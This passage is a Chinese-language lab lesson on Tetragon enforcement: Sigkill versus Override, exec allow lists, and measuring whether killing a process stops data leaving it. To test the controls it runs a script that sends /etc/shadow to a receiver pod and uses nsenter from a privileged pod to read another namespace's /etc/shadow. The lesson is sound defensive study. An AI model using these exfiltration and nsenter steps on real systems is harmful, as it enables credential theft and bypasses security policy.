# Day 6: 從偵測到攔截——SIGKILL 擋得住什麼,擋不住什麼

![Tetragon 官方標誌](../assets/logos/tetragon-icon-color.svg){ align=right width="95" }

> 前五天做的事都是「看」。今天把 Tetragon 的 `return.int_arg` 改掉:違規的行程直接殺掉。但真正要回答的問題不是「殺得掉嗎」——那很容易——而是**殺掉等不等於擋住**,以及**寫錯一條攔截規則,從應用程式那一側看起來是什麼樣子**。兩題的答案都跟直覺不同。

!!! abstract "你在課程的哪裡"
    - **Day 5**:Tetragon 裝好了、寫得出 TracingPolicy、知道核心層過濾是真的,也知道它的 pod 歸屬跟 Falco 錯得一樣。所有攔截開關都刻意關著。
    - **今天**:把那些開關打開。驗收是違規行程確實被 SIGKILL、同命名空間的正常工作負載照常運作,兩邊都要有證據。然後量三件事:SIGKILL 擋不擋得住資料外流、`nsenter` 能不能繞過攔截、寫錯規則的帳單長什麼樣。
    - **接下來**:Sprint 2 的後半段從行程與檔案轉到網路層。

## 攔截不是偵測的加強版

偵測寫錯了,結果是雜訊——[Day 4](sprint2-day4-falco-custom-rules.md) 量過那張帳單:180 筆/分鐘的誤報,吵,但服務好好的。

攔截寫錯了,結果是有東西死掉。而今天會看到,**死掉的方式可能安靜到沒有任何一個健康指標會叫**。

所以今天的順序跟前幾天不一樣:**第一步不是寫攔截策略,是先把「這條策略到底載入了沒有」變成一個可以重複執行的指令**,而且要用一條**故意壞掉**的策略證明那個檢查真的會變紅。只對好策略跑一次檢查,證明的只是綠色的東西是綠的。

| 步驟 | 做什麼 |
|---|---|
| 1 | 把驗收條件工具化,並用壞策略證明它會變紅 |
| 2 | 驗收:命名空間內的 exec 允許清單 |
| 3 | **SIGKILL 是擋住了,還是只是事後把人殺掉** |
| 4 | `nsenter` 能不能繞過攔截 |
| 5 | 寫錯攔截規則的帳單,從應用側看 |
| 6 | 兩套工具的分工,只用量到的東西講 |

在寫任何策略之前,有一件開機時發生的事要先知道:[地雷 1](#mine-1)。

## 步驟 1: 先把「策略載入了沒有」變成一個指令

[Day 5 地雷 4](sprint2-day5-tetragon-basics.md#mine-4) 的教訓今天升級了:**沒載入的偵測策略是漏報,沒載入的攔截策略是「你以為守住了而其實沒有」。**

```bash
cat > policy-state.sh <<'EOF'
#!/usr/bin/env bash
# The only trustworthy check: ask every agent for the policy's state and mode.
# Kubernetes-side signals (apply succeeded, object exists, no status, no events)
# are all green even when the policy failed to load.
# Exit 1 if any agent reports anything other than TP_STATE_ENABLED.
set -uo pipefail
WANT="${1:-}"
rc=0
for pod in $(kubectl -n tetragon get pods -l app.kubernetes.io/name=tetragon -o name); do
  node=$(kubectl -n tetragon get "${pod#pod/}" -o jsonpath='{.spec.nodeName}' 2>/dev/null)
  json=$(kubectl -n tetragon exec "${pod#pod/}" -c tetragon -- \
           tetra tracingpolicy list -o json 2>/dev/null) || continue
  echo "$json" | python3 -c '
import json,sys
want=sys.argv[1]; node=sys.argv[2]; bad=0
for p in (json.load(sys.stdin) or {}).get("policies") or []:
    if want and p.get("name")!=want: continue
    st=p.get("state","?"); print(f"{node}  {p.get(\"name\")}  state={st}  mode={p.get(\"mode\",\"-\")}")
    if st!="TP_STATE_ENABLED": bad=1
sys.exit(bad)' "$WANT" "$node" || rc=1
done
exit $rc
EOF
chmod +x policy-state.sh
```

### 成功長什麼樣

```console
$ kubectl apply -f tracingpolicy-exec-observe.yaml
$ ./policy-state.sh
<node-a>  lab-exec-observe  state=TP_STATE_ENABLED  mode=TP_MODE_MONITOR_ONLY
<node-b>  lab-exec-observe  state=TP_STATE_ENABLED  mode=TP_MODE_MONITOR_ONLY
<node-c>  lab-exec-observe  state=TP_STATE_ENABLED  mode=TP_MODE_MONITOR_ONLY
```

**`mode` 今天跟 `state` 一樣重要**:一條該攔截的策略如果回報 `TP_MODE_MONITOR_ONLY`,它就是一條偵測策略,而 Kubernetes 那一側不會有任何差別。

### 失敗長什麼樣

拿一個很常見的錯來當反例:掛勾名稱打錯一個字母。

```yaml
- call: "security_file_permision"        # 少一個 s
```

```console
$ kubectl apply -f tracingpolicy-badload.yaml
tracingpolicynamespaced.cilium.io/lab-badload created     ← 成功
$ kubectl -n ebpf-lab get tracingpoliciesnamespaced
lab-badload   0s                                          ← 存在
$ … -o json | jq .status
<absent>                                                  ← 沒有 status
$ kubectl describe … | tail -1
Events:  <none>                                           ← 沒有 event

$ ./policy-state.sh lab-badload ; echo rc=$?
<node-a>  lab-badload  state=TP_STATE_LOAD_ERROR  mode=-
<node-b>  lab-badload  state=TP_STATE_LOAD_ERROR  mode=-
<node-c>  lab-badload  state=TP_STATE_LOAD_ERROR  mode=-
rc=1
```

**四個 Kubernetes 端的指標全綠,三顆節點的 agent 全紅。** 為什麼這個欄位擋不下來,見[地雷 2](#mine-2);為什麼別的欄位擋得下來,見[地雷 3](#mine-3)。

## 步驟 2: 驗收——命名空間內的 exec 允許清單

### 允許清單是抄下來的,不是想出來的

策略比對的字串不是命令列上打的路徑,是核心替執行檔解析完的路徑:符號連結跟完、映像檔的 `/bin` 併進 `/usr/bin`。所以第一步是用**零動作**的同一個掛勾跑兩分鐘,把真正會到達策略的字串量出來:

```bash
cat > tracingpolicy-exec-observe.yaml <<'EOF'
apiVersion: cilium.io/v1alpha1
kind: TracingPolicyNamespaced
metadata:
  name: lab-exec-observe
  namespace: ebpf-lab
spec:
  kprobes:
    - call: "security_bprm_check"      # after the kernel resolved the target binary,
      syscall: false                   # before the new image starts running
      args:
        - index: 0
          type: "linux_binprm"
EOF
kubectl apply -f tracingpolicy-exec-observe.yaml
```

```console
$ ./tetra-events.sh --since 60s | …
30 ('lab-worker', '/usr/bin/date')
30 ('lab-worker', '/usr/bin/head')
30 ('lab-worker', '/usr/bin/sleep')
```

工作負載的腳本寫的是 `/bin/date`,但策略看到的是 `/usr/bin/date`。**照腳本寫允許清單,會在第一個 tick 就把工作負載殺掉**([地雷 4](#mine-4))。

掛勾點挑 `security_bprm_check` 而不是 `sys_execve`:在 `sys_execve` 入口,當下的行程還是父行程,而參數是還沒解析的使用者空間指標。`security_bprm_check` 跑在核心開好、解析好目標檔案之後、新映像開始執行之前——**exec 路徑上唯一一個「要跑哪支程式」既已確定、又還攔得住的位置**。

### 策略

```bash
cat > tracingpolicy-exec-allowlist.yaml <<'EOF'
apiVersion: cilium.io/v1alpha1
kind: TracingPolicyNamespaced
metadata:
  name: lab-exec-allowlist
  namespace: ebpf-lab
spec:
  kprobes:
    - call: "security_bprm_check"
      syscall: false
      args:
        - index: 0
          type: "linux_binprm"
      selectors:
        - matchArgs:
            - index: 0
              operator: "NotEqual"     # NotIn is not a valid operator here — see mine 3
              values:
                - "/usr/bin/date"
                - "/usr/bin/head"
                - "/usr/bin/sleep"
                - "/usr/bin/bash"
                - "/bin/bash"
                - "/usr/bin/id"
                - "/usr/bin/cat"
                - "/usr/bin/python3"
                # Every kubectl exec re-execs runc inside the pod's own cgroup,
                # so a namespaced allow list matches it too. Omit this and every
                # exec into the namespace dies — including allowed binaries.
                - "/runc"
          matchActions:
            - action: Sigkill
EOF
kubectl apply -f tracingpolicy-exec-allowlist.yaml
```

那個 `/runc` 是[地雷 5](#mine-5) 換來的,不是想出來的。

```console
$ ./policy-state.sh lab-exec-allowlist
<node-a>  lab-exec-allowlist  state=TP_STATE_ENABLED  mode=TP_MODE_ENFORCE
（三顆節點相同）
```

### 第一半:違規行程確實被殺

```console
$ kubectl -n ebpf-lab exec lab-violator -- /bin/bash -c '/usr/bin/id -u; echo "shell saw rc=$?"'
shell saw rc=137
/bin/bash: line 1:    64 Killed                  /usr/bin/id -u
```

`137 = 128 + 9`,而且那行 `Killed` 是**呼叫端的 shell 自己印的**,不是從 Tetragon 的事件推論出來的。不經 shell 直接發動時:

```console
$ kubectl -n ebpf-lab exec lab-violator -- /usr/bin/id -u
command terminated with exit code 137
```

Tetragon 這一側:

```text
04:22:59.406  ns=ebpf-lab pod=lab-violator  binprm=/usr/bin/id  cur=/bin/bash
              policy=lab-exec-allowlist  act=KPROBE_ACTION_SIGKILL
```

### 第二半:正常工作負載照常運作,而且在做事

驗這一半有個陷阱:**一顆只會 sleep 的 pod,在「什麼都殺光」的策略下看起來一模一樣**。所以工作負載每兩秒實際 exec 兩支程式,再把取得的資料印進心跳:

```console
tick=392 t=04:22:57.750 work=[PRETTY_NAME="Ubuntu 24.0]
tick=393 t=04:22:59.754 work=[PRETTY_NAME="Ubuntu 24.0]   ← 違規行程在這一秒被殺
tick=394 t=04:23:01.759 work=[PRETTY_NAME="Ubuntu 24.0]
tick=395 t=04:23:03.764 work=[PRETTY_NAME="Ubuntu 24.0]
tick=396 t=04:23:05.769 work=[PRETTY_NAME="Ubuntu 24.0]
tick=397 t=04:23:07.773 work=[PRETTY_NAME="Ubuntu 24.0]

$ kubectl -n ebpf-lab get pods
lab-worker  1/1  Running  0  13m       ← 沒有重啟
```

編號連續、間隔穩定 2.005 秒、資料欄位有內容、`RESTARTS 0`。**兩半都有證據。**

同一個窗口 Falco 報了 2 筆告警,**時間戳與 Tetragon 的攔截事件精確到毫秒相同**。同一個核心瞬間,一邊產出一個有名字、有嚴重度、有 MITRE 分類的告警,一邊產出一具屍體。

## 步驟 3: SIGKILL 是擋住了,還是只是事後把人殺掉 {#step-3}

這一題決定攔截值多少錢,而且**官方文件的立場要先擺在前面**:Tetragon 的 enforcement 文件明白警告,送出 `SIGKILL` **不保證**能阻止觸發它的那個操作,並建議把 `Signal` 與 `Override` 併用。文件舉的例子是 `write()` ——訊號送出去了,資料還是可能已經寫進檔案。

所以這一節量的不是「SIGKILL 一般而言擋不擋得住」,而是**掛在這個特定檢查點上時,擋不擋得住**。

### 量測方式

三顆 pod:讀取者、接收者(另一顆節點上的 TCP server)、正常工作負載。**判決不採信被殺行程自己的輸出**——被殺的行程什麼都印不出來——**只採信接收端的日誌**:到得了接收端的位元組,就是離開了那個行程,之後它怎麼死都沒有意義。

洩漏程式把順序壓到語言允許的最緊:**先連線**(socket 的成本在碰檔案之前就付掉),**再讀機密**,**下一行就送出**。

### 基準線:沒有策略

```console
$ python3 /tmp/exfil.py <receiver> 9000 BASELINE
SURVIVED-LEAKED read=0.040ms send=0.039ms bytes=474

接收端: RECEIVED bytes=491 first=b'BASELINE len=474 root:*:20409:0:99999:7:::\ndaemo'
```

`/etc/shadow` 的內容確實會出現在另一顆 pod 的日誌裡。讀取 0.040 毫秒、送出 0.039 毫秒——**攔截要贏,就得贏在這 40 微秒裡面**。

### 掛上 `Sigkill`

```bash
cat > tracingpolicy-shadow-sigkill.yaml <<'EOF'
apiVersion: cilium.io/v1alpha1
kind: TracingPolicyNamespaced
metadata:
  name: lab-shadow-sigkill
  namespace: ebpf-lab
spec:
  kprobes:
    - call: "security_file_permission"   # LSM permission check — runs BEFORE the read
      syscall: false
      args:
        - index: 0
          type: "file"
        - index: 1
          type: "int"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Equal"
              values: ["/etc/shadow"]
            - index: 1
              operator: "Equal"
              values: ["4"]
          matchActions:
            - action: Sigkill
EOF
```

| 測試 | 呼叫端看到 | 接收端拿到 |
|---|---|---|
| 讀後送,兩個 syscall(四輪) | `Killed` / rc=137 | **0 位元組** |
| `cat /etc/shadow > /tmp/stolen`(兩個行程) | `Killed` / rc=137 | 檔案建了,**內容 0 位元組** |
| **`os.sendfile`,讀與送在同一個 syscall 裡** | `Killed` / rc=137 | **只有 26 位元組的標記字串,機密 0 位元組** |

**最後一列是關鍵。** 它把讀與送壓進同一次 syscall,整段複製都在核心裡完成,中間沒有回到使用者空間的機會——如果 SIGKILL 只是「在下一個 syscall 邊界結束行程」,核心已經排進 socket 的東西就跑掉了。實測沒有:接收端只拿到程式在讀檔**前**自己送的 26 位元組標記。

**所以在這個掛勾上,答案是擋住了。而理由不是 SIGKILL 特別強,是掛勾點在操作之前。** `security_file_permission` 是 LSM 的權限檢查,跑在實際讀取之前;BPF 送出訊號之後,核心自己在複製迴圈與 syscall 返回路徑上的檢查點把整件事截斷。

這跟官方那句警告不衝突,兩者合起來就是完整的規則:**決定擋不擋得住的是掛勾點的位置,不是動作是訊號還是回傳值。** 把同一個 `Sigkill` 掛在操作完成之後才觸發的事件上,結論會完全相反——而官方建議「`Signal` 配 `Override`」正是因為不能假設每個掛勾都在操作之前。

### 換成 `Override`

刻意跟上面那條只差一行:同一個掛勾、同樣兩個條件、同一個命名空間、同一支程式、同一行指令,只有動作從 `Sigkill` 換成 `Override` 加 `argError: -1`(也就是 `EPERM`)。跨掛勾比較會把「哪一個動作」跟「哪一個掛勾」混在一起。

```console
$ python3 /tmp/exfil.py <receiver> 9000 OVERRIDE-2
SURVIVED-DENIED errno=1 [Errno 1] Operation not permitted        ← 行程活著,自己印的

接收端: RECEIVED bytes=59 first=b'OVERRIDE-2 DENIED errno=1 [Errno 1] Operation no'

$ /usr/bin/cat /etc/shadow ; echo cat-rc=$?
cat: /etc/shadow: Operation not permitted
cat-rc=1
```

**兩個動作在「機密有沒有外流」上打成平手(都是 0),差別在別的三個地方:**

| | `Sigkill` | `Override` |
|---|---|---|
| 應用得到的資訊 | 沒有。行程消失,`137` 是外面的人看到的 | **`EPERM`**,是應用自己的錯誤處理路徑收得到的東西 |
| 波及範圍 | **整個行程**,見[地雷 6](#mine-6) | 只有那一次操作 |
| 核心記憶體 | **346,976 B** | **2,968,336 B**,見[地雷 7](#mine-7) |

還有一件對防守方不太好聽的事:

```console
$ for i in 1 2 3 4 5; do /usr/bin/cat /etc/shadow >/dev/null 2>&1; echo "attempt $i rc=$?"; done
attempt 1 rc=137 … attempt 5 rc=137        （五次全部 Killed）
parent shell alive, pid=190
$ /usr/bin/cat /etc/passwd | head -2       ← 換一個路徑
root:x:0:0:root:/root:/bin/bash
passwd rc=0
```

**攔截成功五次的代價,對攻擊者只是五個行程。** 他沒有被踢出去、沒有失去立足點、換個路徑就繼續。這不是說攔截沒用——那五次讀取確實一個位元組都沒拿到——而是說**攔截交付的是「這一個動作沒有發生」,不是「這個攻擊者被處理了」**。後者是 Falco 那一側的事:那 5 次重試在 Falco 是 5 筆有名字的告警,會進值班頻道,會有人去看。

### 兩個動作跑在哪裡

| | 位置 | 語意 | 條件 |
|---|---|---|---|
| `Sigkill` | BPF 程式在掛勾點送出訊號,由核心的訊號機制在**返回使用者空間之前**處理 | 結束行程 | agent 回報 `signal: true` |
| `Override` | BPF 程式**直接改寫被掛函式的回傳暫存器** | 讓這一次操作回傳錯誤 | `override_return: true`,而且函式必須可錯誤注入 |

## 步驟 4: `nsenter` 能不能繞過攔截 {#step-4}

[Day 5 地雷 6](sprint2-day5-tetragon-basics.md#mine-6) 證明 Tetragon 會把 `nsenter` 的動作記在**呼叫端**。攔截把這件事從「標籤貼錯」升級成「守備範圍錯」:`TracingPolicyNamespaced` 選的是一組 cgroup,而攻擊者的身分就是那組 cgroup。

兩個呼叫端、一個目標、一模一樣的動作。目標是受保護命名空間裡的 `/etc/shadow`:

```console
=== C1 呼叫端在受保護的命名空間裡（特權 pod）===
lab-worker                                    ← hostname 確認進到目標了
/bin/bash: line 1: 1683 Killed   cat /etc/shadow > /tmp/ns1
cat-rc=137
0                                             ← 讀到 0 位元組

=== C2 呼叫端在另一個命名空間（同樣特權、同一顆節點）===
lab-worker
cat-rc=0
502                                           ← 讀到 502 位元組
```

**同一個檔案、同一支 `cat`、相隔一秒、一個死一個沒事。** C2 完全沒有觸發任何攔截事件。

**根因**:`TracingPolicyNamespaced` 選的是**呼叫端的 cgroup**,而 `nsenter` 換命名空間、不換 cgroup。用一句話講完:**它保護的是那個命名空間的行程,不是那個命名空間的檔案。**

C1 那一筆同時展示了另一面:攔截生效了,但事件把它記在呼叫端名下,而檔案在被進入的那顆 pod 裡——**攔得住不代表查得對**。

### 兩套工具在 C2 的表現

Falco(完全沒有調整過):

```text
04:28:26  Read sensitive file untrusted | cat | pod=<呼叫端>  | /etc/shadow
04:28:27  Read sensitive file untrusted | cat | pod=<攻擊者>  | /etc/shadow
```

**兩次都報了**,包含 Tetragon 攔不到的那一次。pod 欄位一樣是呼叫端([Day 3 地雷 5](sprint2-day3-falco-basics.md#mine-5) 原封不動),但**訊號在**。

而 Tetragon 自己的底層 sensor,把整條攻擊鏈連參數印得清清楚楚:

```text
04:28:27.222  process_exec  <攻擊者 pod>  /bin/bash -c "pid=$(pgrep -f …
04:28:27.255  process_exec  <攻擊者 pod>  /usr/bin/nsenter -t 12054 -m -u -i -n -p …
04:28:27.260  process_exec  <攻擊者 pod>  /usr/bin/cat /etc/shadow
```

**看得見的東西跟擋得住的東西是同一套軟體的兩個部分,而那一秒只有一半有作用。** 觀察是節點範圍的(底層 sensor 對全節點開著),攔截是命名空間範圍的(策略只綁一組 cgroup)——**這個不對稱就是今天最該記住的架構事實**。

要補這個洞,選項只有兩個,兩個都很貴:把攔截策略做成叢集範圍(在共用叢集上風險極高,一條走偏的攔截策略會把別人的元件一起帶走),或者不讓任何 pod 拿到特權加 `hostPID`——也就是**這個洞的真正修補位置在 admission 層,不在執行期**。

## 步驟 5: 寫錯攔截規則的帳單,從應用側看 {#step-5}

把允許清單拿掉一個 `/usr/bin/head`——**不是可疑程式,不是任何人會在程式碼審查裡挑出來的東西**,而工作負載每兩秒呼叫它一次。其他一個字都沒改。

**應用側看到的:**

```console
tick=585 t=04:29:24.719 work=[PRETTY_NAME="Ubuntu 24.0]     ← 最後一筆正常
tick=586 t=04:29:26.724 work=[]                              ← 策略生效
tick=587 t=04:29:28.729 work=[]
…
tick=626 t=04:30:46.921 work=[]                              ← 最後一筆錯誤
tick=627 t=04:30:48.925 work=[PRETTY_NAME="Ubuntu 24.0]     ← 修好
```

**所有健康指標:**

```console
$ kubectl -n ebpf-lab get pod lab-worker
lab-worker  1/1  Running  0  19m                 ← 沒重啟

$ kubectl -n ebpf-lab describe pod lab-worker | sed -n '/Events:/,$p'
Normal  Scheduled  19m  …
Normal  Pulled     19m  …
Normal  Created    19m  …
Normal  Started    19m  …                        ← 19 分鐘前的開機事件,沒有新的
```

**應用日誌裡連 `Killed` 都沒有。** shell 在指令替換 `$(...)` 裡面被殺的子行程不會印那行訊息——同一顆 pod 稍早在 `kubectl exec` 底下被殺時是印的。**同一個攔截,兩種呈現,而生產環境裡的是不印的那一種。**

**41 筆錯誤心跳、82 秒**,服務全程「健康」,輸出全程錯誤。

### 誰注意到了

| | 說了什麼 |
|---|---|
| Kubernetes | 沒有事件、沒有重啟、`1/1 Running` |
| 應用日誌 | 資料欄位變空,沒有錯誤 |
| **Tetragon** | **22 筆**:`/usr/bin/head` 加 `KPROBE_ACTION_SIGKILL` 加策略名——**兇器、被害者、動作全部指名道姓** |
| **Falco** | **22 筆** `Shell spawned by a non-runtime parent`,`shell=bash parent=bash` |

兩邊剛好都是 22 筆。但 **Falco 講的故事是錯的**:它報的是 `bash`,因為 exec 在 `security_bprm_check` 就被殺掉了,`execve` 從來沒有完成,Falco 事件裡的行程名還是舊的那個。**它注意到有事發生、行程名取錯、也完全指不出真正動手的是誰**——因為送出 SIGKILL 的是另一套軟體,而那件事不是一個 syscall。

修復是立即的:

```text
12:30:47  刪掉窄的、套用正確的
12:30:48  tick=627 已經恢復正常
```

**攔截策略的變更是即時的、逐節點的、不需要重啟任何東西**——生效與復原都在一個 tick(2 秒)之內。對照 [Day 4 地雷 1](sprint2-day4-falco-custom-rules.md#mine-1):Falco 改一個規則字元要跑一次 71 秒的 DaemonSet 滾動更新,而且每顆節點都會有數十秒完全沒有監控。**攔截的變更風險比偵測高,但變更本身的機制反而乾淨得多**——這對事故處理很重要:搞砸一條攔截策略之後,你可以在兩秒內把它拿掉。

## 步驟 6: 兩套工具的分工,只用量到的東西講

**一、看得見的範圍不一樣,而這一點今天才變成攔截問題。**

| | Falco | Tetragon |
|---|---|---|
| 觀察範圍 | 節點全域 | 節點全域(底層 sensor)加策略指定範圍 |
| **攔截範圍** | **無** | **只有策略綁定的那組 cgroup** |
| C2(別的命名空間 `nsenter` 進來) | **報了**(pod 認錯) | **逐行記錄,攔截完全沒有觸發** |

最尖銳的一格是右下角:**Tetragon 看見了自己攔不到的那次攻擊。**

**二、每一次事件,Falco 交付判斷,Tetragon 交付動作與細節。**

| 同一個動作 | Falco | Tetragon |
|---|---|---|
| 驗收的違規 exec | 1 筆具名告警(規則名、嚴重度、MITRE),時間戳到毫秒相同 | 1 筆無名事件加**一具屍體**(rc=137) |
| 允許清單誤殺(22 次) | 22 筆告警,**行程名報成 `bash`(錯的)**,指不出動手者 | 22 筆事件,**執行檔、動作、策略名全對** |
| `nsenter` C1 / C2 | 兩次都報,pod 都認錯 | C1 攔截並記錄(pod 認錯),C2 只有流水帳 |

「Falco 名字取錯」那一格是新的:**當 Tetragon 在 `security_bprm_check` 殺掉一次 exec,Falco 的 `execve` 事件永遠拿不到新的執行檔名**,因為那次 exec 從來沒有完成。兩套工具同時上線時,這是一個實際會誤導調查的互動。

**三、變更的形狀相反。**

| | Falco | Tetragon |
|---|---|---|
| 規則或策略變更 | **71 秒 DaemonSet 滾動**,每節點數十秒無監控 | **2 秒內生效,逐節點,不重啟任何東西** |
| 變更風險 | 錯了會吵 | **錯了會殺** |
| 錯誤變更的偵測 | 告警量爆增,看得到 | **所有健康指標全綠** |

**放在一起的操作結論**(只到今天量到的範圍為止):

- **攔截屬於「範圍能被定義清楚、而且範圍就是身分」的地方。** exec 允許清單對一個成分固定的工作負載命名空間有效;對一個誰都能 `nsenter` 進去的節點無效。
- **攔截不能取代偵測,因為它的守備範圍比偵測小。** 今天有一次攻擊 Falco 看到而 Tetragon 沒攔到——如果只裝攔截,那次攻擊是完全靜默的成功。
- **偵測不能取代攔截,因為告警不會讓 `read()` 失敗。** 驗收那一格 Falco 的告警與 Tetragon 的攔截在同一毫秒發生,一個留下紀錄,一個留下 0 位元組。

## 誠實的差距

- **只驗了一個攔截掛勾。** 步驟 3 的結論建立在 `security_file_permission` 上。官方文件警告 SIGKILL 在別的掛勾(例如 `write()`)不保證阻止操作,本課**沒有做那個反例的實測**——章節裡的結論只涵蓋「掛在操作之前的檢查點」這個情況。
- **`Signal` 配 `Override` 的組合沒有試。** 那是官方對「要確保操作不完成」的建議寫法,本課分別測了兩個動作,沒有測併用。
- **exec 吞吐量的代價量不出來。** 500 次 exec 允許清單上的程式,有策略是 0.932/0.977/0.932 秒,無策略是 0.882/0.944 秒——**兩組區間重疊,差距落在雜訊裡**。誠實的結論是「5% 以內,本課的方法分不出來」,不是「零成本」。
- **沒有做長時間的攔截運行。** 最長的連續攔截狀態是十幾分鐘,不知道長期會不會累積出別的問題。
- **叢集範圍的攔截策略完全沒有做。** 叢集上同時跑著其他工作負載,一條走偏的叢集範圍攔截策略會把它們一起帶走,所以步驟 4 提到的那個補法只有推論,沒有實測。

## 驗收 checkpoint

| 驗證 | 判準 | 本課環境的結果 |
|---|---|---|
| 策略真的在攔截模式 | agent 回報 `STATE=enabled` **且** `MODE=enforce` | 三顆節點全部成立 |
| 檢查工具真的會變紅 | 對一條故意壞掉的策略跑同一個檢查,要回非零 | `LOAD_ERROR` ×3,`rc=1` |
| **違規行程被殺** | 呼叫端自己看到訊號,不是從監控事件推論 | shell 印 `Killed`,`rc=137`;直接 exec 是 `exit code 137` |
| **正常工作負載存活** | 同命名空間、跨越擊殺時刻、**而且在做事** | tick 392→397 編號連續,間隔 2.005 秒,資料欄位有內容,`RESTARTS 0` |
| 機密有沒有外流 | 另一顆節點上的接收端收到的機密位元組數 | 無策略 **491 位元組**;`Sigkill` 五次全部 **0**;`sendfile` 版本也是 **0** |
| `nsenter` 繞過 | 同一動作、兩個呼叫端的讀取位元組數 | 命名空間內 **0**;命名空間外 **502**,零攔截事件 |
| 誤殺從應用側可見嗎 | Kubernetes 事件、重啟次數、應用日誌的錯誤行 | 三項全部沒有;唯一症狀是資料欄位變空,持續 82 秒 |

## 地雷記錄

### 地雷 1:冷啟動時 agent 會 panic,而那段時間沒有任何攔截 {#mine-1}

**症狀**:`kubectl get pods` 有一個不起眼的重啟次數。

```console
$ kubectl -n tetragon get pods
tetragon-7qgck  2/2  Running  1 (2m31s ago)  3m33s
```

**根因**:agent 啟動時要向 API server 建立 informer,而叢集冷啟動時 CNI 與 kube-proxy 還沒把那條路打通:

```text
terminated: exitCode 2, reason Error
  "failed to determine if *v1.Pod is namespaced: … i/o timeout" duration=30.011672482s
  "BPF events statistics: 0 received, 0% events loss"
  panic: failed to determine if *v1.Pod is namespaced: …
```

**等 30 秒就 panic 退出,而且退出前自己承認 `0 received`——BPF 程式根本還沒掛上。** DaemonSet 重啟它,第二次成功。

**在偵測情境這只是漏看;在攔截情境這是一段攻擊窗口。** 攔截策略在 agent 起來之前不存在,而節點上的工作負載是跟 agent 一起排程的、不會等它。本次的缺口約 31 秒。

**這條路上沒有任何一個指標會抱怨**:DaemonSet 是 `3/3`,pod 是 `Running`,`RESTARTS` 欄位那個 `1` 是唯一的線索,而它一天之後就會被當成正常。

**修法**:以攔截為前提部署時,冷啟動後要確認 `RESTARTS`,以及 agent 日誌裡有沒有 `Loading sensor name=__base__`——在那之前掛任何攔截策略都是空的。

### 地雷 2:`call` 這個欄位在原理上不可能有 enum {#mine-2}

**症狀**:掛勾名稱打錯一個字母,`kubectl apply` 成功、物件存在、`status` 不存在、`describe` 的 `Events` 是空的,而三顆節點的 agent 全部 `LOAD_ERROR`。

**根因**:`call` 的合法值是「這顆核心當下有哪些符號」——**執行期的性質,不是 API 的性質**。API server 在原理上就無法檢查它。實話只寫在 agent 日誌裡:

```text
level=warn msg="adding tracing policy failed"
  error="… validation error: call \"security_file_permision\": not found"
```

**修法**:驗收條件是 `STATE=enabled`(攔截另外要 `MODE=enforce`),而且**要對一條故意壞掉的策略跑過一次**,否則只證明了綠色的東西是綠的。

### 地雷 3:哪一種打錯字會被擋,是逐欄位決定的 {#mine-3}

同一份 CRD、同一個 `selectors[0]` 底下,兩個欄位對打錯字的態度完全相反。

`matchArgs.operator` **有 enum**,打錯當場退件並附上完整合法值清單:

```console
$ kubectl apply -f tracingpolicy-exec-allowlist.yaml
The TracingPolicyNamespaced "lab-exec-allowlist" is invalid:
* spec.kprobes[0].selectors[0].matchArgs[0].operator: Unsupported value: "NotIn":
  supported values: "Equal", "NotEqual", "Prefix", "NotPrefix", "Postfix", "NotPostfix",
  "GreaterThan", "LessThan", "GT", "LT", "Mask", "SPort", … "InMap", "NotInMap", …
```

而 [Day 5 地雷 4](sprint2-day5-tetragon-basics.md#mine-4) 的 `returnArgAction` **沒有 enum**,打錯就是靜靜地不載入。

**沒有辦法從外觀分辨自己面對的是哪一種**,所以檢查不能挑著做。(`NotIn` 換成 `NotEqual` 帶一整串值,語意就是「都不等於」。)

### 地雷 4:允許清單必須從量測抄下來,不能從腳本抄 {#mine-4}

**症狀**:照著工作負載的腳本寫允許清單,策略一生效工作負載就死。

**根因**:策略比對的是核心替執行檔解析完的路徑——符號連結跟完、`/bin` 併進 `/usr/bin`。腳本寫 `/bin/date`,策略看到 `/usr/bin/date`。

busybox 類的映像更極端:每個小工具都是指向同一支執行檔的符號連結,`date`、`sleep`、`sh` **全部以同一個字串到達策略**,允許清單在它上面完全無法分辨任何東西。

**修法**:先用**零動作的同一個掛勾**跑一段時間,把真正到達策略的字串抄下來,再寫清單。

**而且清單漏掉的東西通常不是危險程式。** 本次效能量測的 `for i in $(seq 1 500)` 整個迴圈瞬間結束,因為 `/usr/bin/seq` 不在清單上——**漏的是沒有人記得自己在用的小工具**。

### 地雷 5:exec 允許清單會殺掉 `runc`,而攔截事件在匯出流裡看不見 {#mine-5}

**症狀**:策略是 `enabled`、`enforce`,工作負載照跑,然後所有 `kubectl exec` 都死了——**包括執行允許清單上的程式**:

```console
$ kubectl -n ebpf-lab exec lab-violator -- /bin/bash -c 'echo ok'
error: Internal error occurred: … OCI runtime exec failed: exec failed:
  unable to start container process: error copying bootstrap data to pipe: write init-p: broken pipe
```

這個錯誤訊息沒有一個字提到 Tetragon、策略或攔截。而**匯出的事件流那 90 秒裡,策略一筆事件都沒有**。

直接接 gRPC 才看得到:

```console
$ kubectl -n tetragon exec <tetragon-pod> -c tetragon -- timeout 22 tetra getevents
04:21:05.744  ns=None pod=None  binprm=/runc  cur=/usr/bin/runc  act=KPROBE_ACTION_SIGKILL
```

**兩件事同時成立:**

1. **每一次 `kubectl exec` 進這個命名空間,runc 都會在容器的 cgroup 裡面重新 exec 自己**,所以命名空間範圍的策略比對得到它、殺得掉它——而它在允許清單上不會有人想到要寫。殺在這一步,目標程式連被檢查的機會都沒有,所以「允許的程式也一起死」。
2. **這筆攔截事件在匯出流裡不存在。** 該行程當下還沒有 pod 歸屬(`ns=None`),而 chart 預設的排除清單把空字串命名空間整個丟掉——**[Day 5 地雷 2](sprint2-day5-tetragon-basics.md#mine-2) 在攔截情境下的後果是「攔截動作本身看不見」**。

**修法**:把 `/runc` 加進允許清單。這不是某座叢集的特性,是「用 exec 允許清單管一個命名空間」這個做法的固有代價。

### 地雷 6:`Sigkill` 的波及範圍是整個行程,包含跟違規無關的部分 {#mine-6}

違規行程在讀機密**之前**就已經開好一條到另一顆 pod 的 TCP 連線。`Sigkill` 生效後,接收端記到的是一筆 **0 位元組的連線**——那條 socket 被一起帶走。

同一條策略換成 `Override`,行程活著收到 `EPERM`,**用同一條 socket 把自己的錯誤回報送了出去**(59 位元組)。

真實工作負載裡,那條「無關的連線」可能是進行到一半的交易、還沒 flush 的緩衝區、或別的客戶的請求。**選 `Sigkill` 還是 `Override`,不是選哪個比較安全,是選要付哪一種代價。**

### 地雷 7:`Override` 不是只能用在 syscall,但核心記憶體是 8.5 倍 {#mine-7}

